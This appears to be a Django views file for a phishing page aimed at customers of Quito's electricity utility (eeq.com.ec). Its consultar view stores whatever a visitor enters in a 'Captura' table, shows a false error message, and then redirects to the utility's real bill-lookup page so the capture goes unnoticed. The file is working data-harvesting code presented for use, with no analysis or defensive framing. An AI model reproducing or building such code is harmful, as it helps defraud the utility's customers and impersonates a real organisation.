from django.shortcuts import render, redirect
from .models import Captura
from django.contrib import messages
from django.http import HttpResponseRedirect
from django.urls import reverse

# Create your views here.
def index (request):
    return render(request, 'paginaPrincipal/index.html')



def consultar(request):
    if request.method == 'POST':
        dato = request.POST.get("inputBusqueda", "").strip()
        
        if dato:
            Captura.objects.create(datoCapturado=dato)
            messages.error(request, "Revise los datos ingresados")
        else:
            messages.error(request, "Revise los datos ingresados")
        
        # Redirige a la URL externa (¡usa la URL completa con https://!)
        return HttpResponseRedirect("https://www.eeq.com.ec/consulte-su-factura")
    
    # Si no es POST, también redirige a la URL externa (o ajusta según tu lógica)
    return HttpResponseRedirect("https://www.eeq.com.ec/consulte-su-factura")

